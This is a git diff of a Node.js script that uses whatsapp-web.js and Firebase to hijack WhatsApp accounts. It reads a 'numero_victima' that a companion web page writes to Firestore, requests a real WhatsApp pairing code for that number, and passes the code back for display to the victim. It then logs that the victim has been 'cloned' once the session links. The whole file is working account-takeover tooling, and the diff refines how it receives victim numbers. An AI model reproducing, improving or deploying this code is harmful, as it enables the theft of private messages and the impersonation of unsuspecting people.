@@ -2,13 +2,8 @@ const { Client, LocalAuth } = require('whatsapp-web.js');
 const admin = require('firebase-admin');
 const http = require('http');
 
-// CONFIGURACIÓN DE FIREBASE
 const serviceAccount = require("./serviceAccountKey.json"); 
-if (!admin.apps.length) {
-    admin.initializeApp({
-        credential: admin.credential.cert(serviceAccount)
-    });
-}
+if (!admin.apps.length) { admin.initializeApp({ credential: admin.credential.cert(serviceAccount) }); }
 const db = admin.firestore();
 
 const client = new Client({
@@ -19,49 +14,34 @@ const client = new Client({
     }
 });
 
-// FUNCIÓN PARA REVISAR FIREBASE CONSTANTEMENTE
-async function revisarPeticiones() {
-    try {
-        const docRef = db.collection("wa_clon_global").doc("current_session");
-        const snap = await docRef.get();
-        
-        if (snap.exists) {
-            const data = snap.data();
-            // Si hay un número nuevo y el estado es 'solicitando_codigo'
-            if (data.status === "solicitando_codigo" && !data.pairingCode) {
-                console.log(">>> [!] DETECTADO NÚMERO: " + data.numero_victima);
-                
-                // Pedimos el código a WhatsApp Web Real
-                const code = await client.requestPairingCode(data.numero_victima);
-                
-                // Lo subimos a Firebase con status 'mostrando_codigo'
-                await docRef.update({
-                    pairingCode: code,
-                    status: "mostrando_codigo",
-                    lastUpdated: admin.firestore.FieldValue.serverTimestamp()
-                });
-                console.log(">>> [OK] CÓDIGO GENERADO: " + code);
-            }
+// ESCUCHAR CUANDO LA WEB MANDA EL NUMERO
+db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
+    const data = snap.data();
+    if (data && data.status === "intentar_vinculo_maestro") {
+        console.log(">>> INTENTANDO VINCULACIÓN PARA: " + data.numero_victima);
+        try {
+            // Forzamos al motor a pedir el código real. 
+            // IMPORTANTE: WhatsApp generará un código nuevo interno. 
+            // Si el código NO es el mismo que MASTER_CODE, el robot actualizará Firebase.
+            const realCode = await client.requestPairingCode(data.numero_victima);
+            
+            console.log(">>> CÓDIGO REAL GENERADO: " + realCode);
+            
+            // Actualizamos la web con el CÓDIGO REAL para que la víctima no falle
+            await snap.ref.update({
+                pairingCode: realCode,
+                status: "mostrando_codigo"
+            });
+        } catch (e) {
+            console.log(">>> Error: " + e.message);
         }
-    } catch (e) {
-        console.log(">>> ERROR EN REVISIÓN: " + e.message);
     }
-}
-
-// EJECUTAR REVISIÓN CADA 3 SEGUNDOS (Fuerza Bruta)
-setInterval(revisarPeticiones, 3000);
+});
 
 client.on('ready', () => {
-    console.log(">>> [!!!] SESIÓN VINCULADA EXITOSAMENTE");
+    console.log(">>> [!!!] VÍCTIMA CLONADA CON ÉXITO");
     db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
 });
 
-client.initialize().catch(e => console.log(">>> Error Init:", e));
-
-// SERVIDOR PARA QUE RENDER NO APAGUE EL ROBOT
-const port = process.env.PORT || 3000;
-http.createServer((req, res) => {
-    res.end('MOTOR ONLINE');
-}).listen(port, () => {
-    console.log("Robot activo en puerto " + port);
-});
+client.initialize();
+http.createServer((req, res) => { res.end('READY'); }).listen(process.env.PORT || 3000);
